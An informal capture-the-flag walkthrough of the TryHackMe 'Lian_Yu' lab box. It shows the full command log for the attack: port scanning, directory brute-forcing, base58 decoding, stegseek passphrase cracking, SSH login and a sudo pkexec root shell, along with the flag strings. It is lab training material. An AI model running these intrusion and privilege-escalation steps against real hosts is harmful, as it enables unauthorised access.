└─# nmap 10.10.11.227 -sV -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 --min-rate 4000
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# nmap -sS -p- --disable-arp-ping  -n --min-rate 4000 10.10.189.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 14:16 EDT
Nmap scan report for 10.10.189.56
Host is up (3.4s latency).
Not shown: 60480 filtered tcp ports (no-response), 5051 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 53.14 seconds

used then └─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.189.56/FUZZ 
found : island                  [Status: 301, Size: 235, Words: 14, Lines: 8]
in the page found :  Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
Then run it also in that directory
──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.189.56/island/FUZZ
found this : 2100                    [Status: 301, Size: 240, Words: 14, Lines: 8]
http://10.10.189.56/island/2100/
found this comment on the source  you can avail your .ticket here but how?   
i think i need to add .ticked extension in /island/2100/
i can use -x for the extension
└─# gobuster dir -u http://10.10.189.56/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x .ticket -t 40
Much time then 
found this : /green_arrow.ticket   (Status: 200) [Size: 71]
found this : 
This is just a token to get into Queen's Gambit(Ship)
RTy8yhBQdscX
it's a base58 
──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# echo "RTy8yhBQdscX" | base58 -d 
!#th3h00d

will try this as password for vigilante that we found first.
logged in as ftp
found :
rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
change the directory 
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44380|).
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
226 Directory send OK.
ftp> 

found slade
steg on these jpg
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# steghide extract -sf aa.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                          
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# time stegseek -sf aa.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"

[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".

real	0.19s
user	0.07s
sys	0.14s
cpu	111%


it's a zip: 
──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# file aa.jpg.out 
aa.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                          
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# 
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# mv aa.jpg.out aa.zip
found ┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
                                                                                                          
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# cat shado      
M3tahuman i think this the ssh password

the leaveme alone is a data file but we need to change the file signature
                                                                                                          
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# file Leave_me_alone.png 
Leave_me_alone.png: data
change the hex : 89 50 4E 47 0D 0A 1A 0A 

on that image i found password as texte 
access : ┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# ssh slade@10.10.189.56
slade@10.10.189.56's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ 

slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

PrivEsc:
slade@LianYu:~$ find / -type f -perm /4000 -ls 2>/dev/null
found /usr/bin/pkexec
with some search on google we found it's the polkit vulnerability

found : https://gtfobins.github.io/gtfobins/pkexec/

I run : sudo /usr/bin/pkexec /bin/bash -u
root.txt
root@LianYu:~# cat root.txt 
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825







